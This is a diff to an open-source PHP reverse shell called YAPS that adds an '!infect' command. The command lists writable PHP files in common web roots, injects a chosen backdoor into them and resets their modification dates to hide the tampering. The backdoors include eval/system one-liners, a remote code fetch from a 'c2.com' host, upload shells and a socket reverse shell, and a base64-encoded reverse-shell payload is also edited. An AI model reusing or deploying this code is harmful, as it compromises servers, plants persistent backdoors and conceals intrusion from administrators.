@@ -1,12 +1,12 @@
 <?php
 # YAPS - Yet Another PHP Shell
-# Version 1.2.2 - 18/07/21
+# Version 1.2.1 - 28/07/21
 # Made by Nicholas Ferreira
 # https://github.com/Nickguitar/YAPS
 
 
 //error_reporting(0);
-$version = "1.2.2";
+$version = "1.3";
 set_time_limit(0);
 ignore_user_abort(1);
 ini_set('max_execution_time', 0);
@@ -29,7 +29,7 @@ $color = true; // prompt, banner, info colors (better readability)
 $use_password = false; // only allows remote using the shell w/ password
 // sha512("vErY_Go0d_$aLt".sha512("password123"))
 $salt = 'v_3_r_Y___G_o_0_d___s_4_L_t';
-$pass_hash = "38f7bbf8ccd3fdf407e7922c9376e14adcd6c3e30f428817a60562b68a433728e02fda482e0b10fe02bf83e43c890b603ba5ed8d439c087511515dbec04a1536"; // default: pass123
+$pass_hash = "f00945860424fa6148e329772c08e7d05d7fab6f69a4722b4c66c164acdb018ecc0cbc62060cc67e7ae962c65ab5967620622cc12206627229b94106b66db6b8"; // default: pass123
 $auto_verify_update = false; // if true, will check on every run for update
 $silent = false; //if true, does not display banner on connect
 
@@ -51,9 +51,9 @@ $banner = cyan('
          O   o---o  O--o   o-o
          |   |   |  |         )
          o   o   o  o     o--o
-        Yet Another  PHP  Shell').white('
+        Yet Another  PHP  Shell').'
               Version '.$version.'
-       Coder: Nicholas Ferreira');
+       Coder: Nicholas Ferreira';
 
 ########################## PARSE ARGV ########################
 
@@ -90,6 +90,7 @@ $commands = array(
 	"duplicate",
 	"enum",
 	"help",
+	"infect",
 	"info",
 	"passwd",
 	"php",
@@ -123,10 +124,10 @@ function white($str){
 
 function banner(){
 	global $banner;
-	return $banner.'
+	return $banner.white('
 
-   This is '.red('NOT').' an interactive shell.
-       Use '.green('!help').' to see commands.';
+   This is ').red('NOT').white(' an interactive shell.
+       Use ').green('!help').white(' to see commands.');
 }
 
 function usage(){
@@ -188,6 +189,8 @@ function help(){
   	Spawn another reverse shell
   '.cyan('!enum').'
   	Download Linpeas and Linenum to /tmp and get it ready to run
+  '.cyan('!infect').'
+  	Inject payloads into PHP files
   '.cyan('!info').'
   	List information about target
   './*cyan('!download <target file>').'
@@ -443,7 +446,8 @@ function runPHP($code){ // guess what
 function stabilize($post_socket=""){ // spawn an interactive shell
 	global $s, $port, $ip;
 
-	$payload = "JHNjcmlwdD1zaGVsbF9leGVjKCJ3aGljaCBzY3JpcHQiKTskcHkzPXNoZWxsX2V4ZWMoIndoaWNoIHB5dGhvbjMiKTskcHk9c2hlbGxfZXhlYygid2hpY2ggcHl0aG9uIik7aWYoc3RybGVuKCRzY3JpcHQpPjYgJiYgc3RycG9zKCRzY3JpcHQsIm5vdCBmb3VuZCIpPT1mYWxzZSkgJHN0YWJpbGl6ZXI9Ii9iaW4vYmFzaCAtY2kgJyIuJHNjcmlwdC4iIC1xYyAvYmluL2Jhc2ggL2Rldi9udWxsJyI7ZWxzZSBpZihzdHJsZW4oJHB5Myk+NyAmJiBzdHJwb3MoJHNjcmlwdCwibm90IGZvdW5kIik9PWZhbHNlKSAkc3RhYmlsaXplcj0kcHkzLiIgLWMgJ2ltcG9ydCBwdHk7cHR5LnNwYXduKFwiL2Jpbi9iYXNoXCIpJyI7ZWxzZSBpZihzdHJsZW4oJHB5KT42ICYmIHN0cnBvcygkc2NyaXB0LCJub3QgZm91bmQiKT09ZmFsc2UpICRzdGFiaWxpemVyPSRweS4iIC1jICdpbXBvcnQgcHR5O3B0eS5zcGF3bihcIi9iaW4vYmFzaFwiKSciO2Vsc2UgJHN0YWJpbGl6ZXI9Ii9iaW4vYmFzaCI7JHN0YWJpbGl6ZXI9c3RyX3JlcGxhY2UoIlxuIiwiIiwkc3RhYmlsaXplcik7JHNoZWxsPSJ1bmFtZSAtYTskc3RhYmlsaXplcjtzZXQgK28gaGlzdG9yeTtleHBvcnQgSElTVFNJWkU9MDt1bnNldCBISVNUU0laRSBISVNURklMRTsiO3VtYXNrKDApOyRzb2NrPWZzb2Nrb3BlbigiSVBfQUREUiIsUE9SVCwkZXJybm8sJGVycnN0ciwzMCk7JHN0ZD1hcnJheSggMCA9PiBhcnJheSgicGlwZSIsInIiKSwxID0+IGFycmF5KCJwaXBlIiwidyIpLDIgPT4gYXJyYXkoInBpcGUiLCJ3IikgKTskcHJvY2Vzcz1wcm9jX29wZW4oJHNoZWxsLCRzdGQsJHBpcGVzKTtmb3JlYWNoKCRwaXBlcyBhcyAkcCkgc3RyZWFtX3NldF9ibG9ja2luZygkcCwwKTtzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLDApO3doaWxlKCFmZW9mKCRzb2NrKSl7JHJlYWRfYT1hcnJheSgkc29jaywkcGlwZXNbMV0sJHBpcGVzWzJdKTtpZihpbl9hcnJheSgkc29jaywkcmVhZF9hKSkgZndyaXRlKCRwaXBlc1swXSxmcmVhZCgkc29jaywyMDQ4KSk7aWYoaW5fYXJyYXkoJHBpcGVzWzFdLCRyZWFkX2EpKSBmd3JpdGUoJHNvY2ssZnJlYWQoJHBpcGVzWzFdLDIwNDgpKTtpZihpbl9hcnJheSgkcGlwZXNbMl0sJHJlYWRfYSkpIGZ3cml0ZSgkc29jayxmcmVhZCgkcGlwZXNbMl0sMjA0OCkpO30gZmNsb3NlKCRzb2NrKTtmb3JlYWNoKCRwaXBlcyBhcyAkcCkgZmNsb3NlKCRwKTtwcm9jX2Nsb3NlKCRwcm9jZXNzKTs=";// modified php-reverse-shell (works w/ sudo, mysql, ftp, su, etc.) 
+	$payload = "JHNjcmlwdD1zaGVsbF9leGVjKCJ3aGljaCBzY3JpcHQiKTskcHkzPXNoZWxsX2V4ZWMoIndoaWNoIHB5dGhvbjMiKTskcHk9c2hlbGxfZXhlYygid2hpY2ggcHl0aG9uIik7aWYoc3RybGVuKCRzY3JpcHQpPjYgJiYgc3RycG9zKCRzY3JpcHQsIm5vdCBmb3VuZCIpPT1mYWxzZSkgJHN0YWJpbGl6ZXI9Ii9iaW4vYmFzaCAtY2kgJyIuJHNjcmlwdC4iIC1xYyAvYmluL2Jhc2ggL2Rldi9udWxsJyI7ZWxzZSBpZihzdHJsZW4oJHB5Myk+NyAmJiBzdHJwb3MoJHNjcmlwdCwibm90IGZvdW5kIik9PWZhbHNlKSAkc3RhYmlsaXplcj0kcHkzLiIgLWMgJ2ltcG9ydCBwdHk7cHR5LnNwYXduKFwiL2Jpbi9iYXNoXCIpJyI7ZWxzZSBpZihzdHJsZW4oJHB5KT42ICYmIHN0cnBvcygkc2NyaXB0LCJub3QgZm91bmQiKT09ZmFsc2UpICRzdGFiaWxpemVyPSRweS4iIC1jICdpbXBvcnQgcHR5O3B0eS5zcGF3bihcIi9iaW4vYmFzaFwiKSciO2Vsc2UgJHN0YWJpbGl6ZXI9Ii9iaW4vYmFzaCI7JHN0YWJpbGl6ZXI9c3RyX3JlcGxhY2UoIlxuIiwiIiwkc3RhYmlsaXplcik7JHNoZWxsPSJ1bmFtZSAtYTskc3RhYmlsaXplciI7dW1hc2soMCk7JHNvY2s9ZnNvY2tvcGVuKCJJUF9BRERSIixQT1JULCRlcnJubywkZXJyc3RyLDMwKTskc3RkPWFycmF5KCAwID0+IGFycmF5KCJwaXBlIiwiciIpLDEgPT4gYXJyYXkoInBpcGUiLCJ3IiksMiA9PiBhcnJheSgicGlwZSIsInciKSApOyRwcm9jZXNzPXByb2Nfb3Blbigkc2hlbGwsJHN0ZCwkcGlwZXMpO2ZvcmVhY2goJHBpcGVzIGFzICRwKSBzdHJlYW1fc2V0X2Jsb2NraW5nKCRwLDApO3N0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssMCk7d2hpbGUoIWZlb2YoJHNvY2spKXskcmVhZF9hPWFycmF5KCRzb2NrLCRwaXBlc1sxXSwkcGlwZXNbMl0pO2lmKGluX2FycmF5KCRzb2NrLCRyZWFkX2EpKSBmd3JpdGUoJHBpcGVzWzBdLGZyZWFkKCRzb2NrLDIwNDgpKTtpZihpbl9hcnJheSgkcGlwZXNbMV0sJHJlYWRfYSkpIGZ3cml0ZSgkc29jayxmcmVhZCgkcGlwZXNbMV0sMjA0OCkpO2lmKGluX2FycmF5KCRwaXBlc1syXSwkcmVhZF9hKSkgZndyaXRlKCRzb2NrLGZyZWFkKCRwaXBlc1syXSwyMDQ4KSk7fSBmY2xvc2UoJHNvY2spO2ZvcmVhY2goJHBpcGVzIGFzICRwKSBmY2xvc2UoJHApO3Byb2NfY2xvc2UoJHByb2Nlc3MpOw==";// modified php-reverse-shell (works w/ sudo, mysql, ftp, su, etc.) 
+
 	if(strlen($post_socket) > 1 && strlen($post_socket) > 0){ //if is set
 		echo $post_socket;
 		$skt = explode(":", $post_socket);
@@ -642,6 +646,148 @@ function verify_update(){
 	return;
 }
 
+function getFiles($dir){ // return writable php files on webserver root
+	$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)); //list recursively
+	$list = array();
+	foreach($iterator as $file)
+	    if(!is_dir($file) && is_writable($file)) //list only writable files
+	    	if($file->getPathName() !== $_SERVER["SCRIPT_FILENAME"]) //remove myself from list
+	    		if(substr($file->getPathName(),-4) == ".php") //list only php files
+	    			array_push($list,$file->getPathName());
+	sort($list);
+	return $list;
+}
+
+function select_files(){
+	global $s;
+
+	$webdir = array('/var/www/','/srv/','/usr/local/apache2/','/var/apache2/','/var/www/nginx-default/');
+	$webfiles_arr = array();
+	foreach($webdir as $dir)
+		try{
+			$list = getFiles($dir);
+			$webfiles_arr = array_merge($webfiles_arr,$list);
+		}catch(Exception $e){}
+
+	if(count($webfiles_arr) > 0) fwrite($s, cyan("[*] ").white("Found ".count($webfiles_arr)." writable PHP files:\n"));
+
+	for($i=0;$i<count($webfiles_arr);$i++)
+		fwrite($s, red("[$i] ").$webfiles_arr[$i].PHP_EOL);
+
+	fwrite($s,cyan("\n[*] ").white("Choose the files you want to infect.\n    Separate by comma (e.g:1,5,7,8) and/or by range (e.g:10-16).\n    Files: "));
+
+	while($data2 = fread($s, 1024)){ //receive numbers and parse
+		$files = str_replace(" ", "", substr($data2, 0, -1)); //remove whitespaces and newline at end
+		$files = explode(",",$files); //split 
+		if(count($files) == 1 && $files[0] == "") return; //no file selected
+		$toInfect = array();
+		foreach($files as $file){
+			if(preg_match("/^[0-9]+$/",$file)) // filter numbers
+				array_push($toInfect, $file);
+
+			if(preg_match("/^[0-9]+\-[0-9]+$/",$file)){ // filter ranges
+				$range = explode("-",$file); // ex:4-6   ->  $range[0]=4, $range[1]=6
+				if((int)$range[0] < (int)$range[1]) // 4 must be < than 6
+					for($i=(int)$range[0];(int)$i<=$range[1];$i++) // from i=4 to i=6
+						array_push($toInfect, $i);
+			}
+		}
+		sort($toInfect,SORT_NUMERIC);
+		choose_payload($webfiles_arr,array_unique($toInfect)); //remove duplicates
+		return;
+	}
+}
+
+function choose_payload($allFiles,$toInfect){
+	global $s;
+	$payloads = array(
+		//curl -d "0=whoami" website.com/infected_file.php
+		//curl website.com/infected_file.php?0=whoami
+		"0. TinyRCE	" => '<?=`$_REQUEST[0]`;?>',
+		
+		//same
+		"1. ClassicRCE	" => '<?=@system($_REQUEST[0]);?>',
+		
+		//curl -d "0=phpinfo();" website.com/infected_file.php
+		"2. Eval		" => '<?=@eval($_REQUEST[0]);?>',
+
+		//curl -d "0=cGhwaW5mbygpOw==" website.com/infected_file.php  (encoded phpinfo())
+		"3. BasedEval	" => '<?=@eval(base64_decode($_REQUEST[0]));?>',
+		
+		//curl -d "0=c2.com/file_to_be_executed.txt" website.com/infected_file.php
+		"4. RemotePHP	" => '<?=@eval(file_get_contents($_REQUEST[0]));?>',
+		
+		//curl -d "0=c2.com/file_to_upload&1=extension" website.com/infected_file.php
+		"5. RemoteUpload	" => '<?=$x=rand(100,999);@file_put_contents("./".$x.".".$_REQUEST[1],@file_get_contents($_REQUEST[0]));echo $x.$_REQUEST[1];?>',
+		
+		//curl -F "0=@file_to_upload.php" website.com/infected_file.php
+		"6. LocalUpload	" => '<?php if(isset($_FILES["0"]))if(move_uploaded_file($_FILES["0"]["tmp_name"],"_".$_FILES["0"]["name"]))echo"Uploaded: _".$_FILES["0"]["name"];?>',
+
+		//curl "0=your_ip&1=port" website.com/infected_file.php
+		"7. StableShell	" => '<?php $a="script -qc /bin/bash /dev/null";umask(0);$b=fsockopen($_REQUEST[0],$_REQUEST[1],$c,$d,30);$e=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$f=proc_open($a,$e,$g);foreach($g as $p)stream_set_blocking($p,0);stream_set_blocking($b,0);while(!feof($b)){$i=array($b,$g[1],$g[2]);if(in_array($b,$i))fwrite($g[0],fread($b,2048));if(in_array($g[1],$i))fwrite($b,fread($g[1],2048));if(in_array($g[2],$i))fwrite($b,fread($g[2],2048));}fclose($b);foreach($g as $p)fclose($p);proc_close($f);?>'
+	);
+
+	fwrite($s, cyan("\n[i] ").white("List of payloads available:\n"));
+	$i=true;
+	foreach($payloads as $name => $code){
+		$desc = $i ? cyan($name).$code : cyan($name).white($code);
+		fwrite($s, $desc."\n");
+		$i = !$i; //toggle payload color
+	}
+
+	fwrite($s, cyan("\n[?] ").white("Choose a payload to infect the selected files (default:0): "));
+	while($choosed_payload = fread($s, 128)){
+		$user_payload = 0;
+		if((int)$choosed_payload <= count($payloads)+1)
+			$user_payload = $choosed_payload;
+		break;
+	}
+	fwrite($s, cyan("[?] ").white("Do you want do insert the payload at the beginning [0] or end [1] of the file (default: 1)? "));
+	while($position = fread($s, 128)){
+		$position = 1;
+		if((int)$position === 0) $position = 0;
+		break;
+	}
+	infect($allFiles,$toInfect,(int)$user_payload,$payloads,(int)$position);
+	return;
+}
+
+//list of all writable php files, files to be infected, index of choosen payload, list of payload, position (beginning or end of file)
+function infect($allFiles,$fileArr,$payload_index,$payload_list,$position=1){
+	// 1 = end; 0 = beginning
+	global $s;
+	$payload = $payload_list[array_keys($payload_list)[$payload_index]]; //the payload itself
+	fwrite($s, yellow("\n[!] ").white("Files to infect:\n"));
+	foreach($fileArr as $fileToInfect)
+		fwrite($s,$allFiles[$fileToInfect]."\n");
+
+	fwrite($s, yellow("[!] ").white("Payload: ").$payload_list[array_keys($payload_list)[$payload_index]]."\n");
+	$position_str = $position ? "End of file" : "Beginnig of file";
+	fwrite($s, yellow("[!] ").white("Position: ").$position_str."\n");
+	fwrite($s, cyan("[?] ").white("Are you sure you want to infect those files? [Y/n]"));
+	while($sure = fread($s, 128)){
+		if(strtolower(substr($sure,0,1)) == "n") return; //not sure, return
+		break;
+	}
+
+	foreach($fileArr as $fileToInfect){
+		$filePath = $allFiles[$fileToInfect]; //fileToInfect is an integer that is the index of the array $allFiles
+		if(isAvailable("file_get_contents") && isAvailable("file_put_contents")){
+			$old = file_get_contents($filePath);
+			$originalDate = str_replace("\n","",run_cmd("stat ".$filePath.' | grep Modify | sed "s/Modify: //"')); //modify date
+			if($position) //end of file
+				$written = file_put_contents($filePath, "\n".$payload, FILE_APPEND) ? 1 : 0;
+			else //beginning of file
+				$written = file_put_contents($filePath, $payload."\n".$old) ? 1 : 0;
+			$result = $written ? green("[+] ").white($filePath." was infected with payload !") : red("[-] ").white($filePath." Error!");
+			fwrite($s,$result."\n");
+			if(run_cmd("touch -d ".'"'.$originalDate.'" '.$filePath)) 
+				fwrite($s,green("[+] ").white("Mantained original 'modified date' (".$originalDate.").\n"));
+		}
+	}
+	return;
+}
+
 function parse_stdin($input){
 	global $s, $color;
 	switch(substr($input,0,-1)){ // remove newline at end
@@ -683,6 +829,9 @@ function parse_stdin($input){
 			break;
 		case "!duplicate":
 			duplicate();
+			break;
+		case "!infect":
+			select_files();
 			break;
 	}	
 }
@@ -737,7 +886,7 @@ function connect(){
 	fclose($s);
 }
 
-########################## END FUNCTION ##########################
+########################## END FUNCTIONS ##########################
 
 if($auto_verify_update) verify_update();
 
@@ -746,6 +895,6 @@ if(isset($_REQUEST['stabilize']) && $_REQUEST['stabilize']){ //stabilized shell 
 	stabilize($x);
 }else{ // use normal (not interactive) connection
 	$s = @fsockopen("tcp://$ip", $port);
-	if(!$s) die(red("[-]")."Couldn't connect to socket $ip:$port.");
+	if(!$s) die(red("[-] ")."Couldn't connect to socket $ip:$port.");
 	connect();
 }
